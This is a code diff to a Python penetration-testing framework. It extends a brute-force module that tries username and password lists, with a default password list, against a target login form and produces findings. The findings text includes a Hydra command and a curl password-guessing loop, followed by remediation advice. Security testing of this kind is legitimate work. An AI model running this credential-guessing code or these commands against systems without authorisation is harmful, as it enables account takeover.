@@ -21,6 +21,8 @@ class ModuleExecutor:
         """Initialize module executor"""
         self.request_handler = RequestHandler()
         self.payload_engine = PayloadEngine()
+        from app.core.session_manager import SessionManager
+        self.session_manager = SessionManager(use_redis=False)
     
 
     async def execute_module(
@@ -1209,42 +1211,97 @@ Confidence: {int(result.confidence * 100)}%
     
     async def _execute_brute_force(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
         """Execute brute force testing"""
-        from app.modules.brute_force import BruteForceTester
+        from app.modules.brute_force import BruteForceTester, LoginConfig, LoginMethod, SuccessDetectionMethod
         
-        tester = BruteForceTester(self.request_handler)
-        username = parameters.get("username", "admin")
+        tester = BruteForceTester(self.request_handler, self.session_manager)
         
-        results = await tester.test_brute_force(url=target.url, username=username, headers=target.custom_headers or {})
+        # Handle usernames
+        usernames = []
+        if parameters.get("username"):
+            usernames.append(parameters["username"])
+        
+        if parameters.get("username_list"):
+            content = parameters["username_list"]
+            if isinstance(content, str):
+                usernames.extend([u.strip() for u in content.split('\n') if u.strip()])
+        
+        if not usernames:
+            usernames = ["admin"]
+            
+        # Handle passwords
+        passwords = []
+        if parameters.get("password"):
+            passwords.append(parameters["password"])
+            
+        if parameters.get("password_list"):
+            content = parameters["password_list"]
+            if isinstance(content, str):
+                passwords.extend([p.strip() for p in content.split('\n') if p.strip()])
+        
+        if not passwords:
+            passwords = ["password", "123456", "admin", "welcome", "12345678"]
+            
+        # Configure login
+        success_detection = parameters.get("success_detection", "regex")
+        detection_method = SuccessDetectionMethod.REGEX
+        if success_detection == "status_code":
+            detection_method = SuccessDetectionMethod.STATUS_CODE
+        elif success_detection == "redirect":
+            detection_method = SuccessDetectionMethod.REDIRECT
+        elif success_detection == "cookie":
+            detection_method = SuccessDetectionMethod.COOKIE
+            
+        config = LoginConfig(
+            url=target.url,
+            method=LoginMethod.POST,
+            username_param=parameters.get("username_param", "username"),
+            password_param=parameters.get("password_param", "password"),
+            success_detection=detection_method,
+            success_regex=parameters.get("success_regex"),
+            failure_regex=parameters.get("failure_regex"),
+            delay_between_attempts=float(parameters.get("delay", 0.5))
+        )
+        
+        # Execute attack
+        results = await tester.brute_force_login(config, usernames, passwords)
         
         findings = []
         for result in results:
-            if result.is_vulnerable:
+            if result.success:
                 description = f"""=== VULNERABILITY SUMMARY ===
 Weak Credentials Detected
-Username: {username}
-Password: {result.password if hasattr(result, 'password') else 'Found'}
+Username: {result.username}
+Password: {result.password}
 
 === BRUTE FORCE TOOLS ===
 
 1. HYDRA:
-   hydra -l {username} -P passwords.txt {target.url} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+   hydra -l {result.username} -P passwords.txt {target.url} http-post-form "/login:{config.username_param}=^USER^&{config.password_param}=^PASS^:F=incorrect"
    
 2. BURP INTRUDER:
    Use Burp Intruder with password list
    
 3. CUSTOM SCRIPT:
    for pwd in $(cat passwords.txt); do
-     curl -d "username={username}&password=$pwd" {target.url}
+     curl -d "{config.username_param}={result.username}&{config.password_param}=$pwd" {target.url}
    done"""
                 
                 findings.append({
                     "vulnerability_type": "Weak Credentials",
                     "severity": "high",
                     "description": description,
-                    "remediation": "1. Strong password policy\n2. Account lockout\n3. Rate limiting\n4. CAPTCHA\n5. MFA"
+                    "remediation": "1. Strong password policy\\n2. Account lockout\\n3. Rate limiting\\n4. CAPTCHA\\n5. MFA"
                 })
         
-        return {"status": "completed", "findings": findings}
+        return {
+            "status": "completed",
+            "findings": findings,
+            "summary": {
+                "usernames_tested": len(usernames),
+                "passwords_tested": len(passwords),
+                "successful_logins": len(findings)
+            }
+        }
     
     async def _execute_file_upload(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
         """Execute file upload bypass testing"""
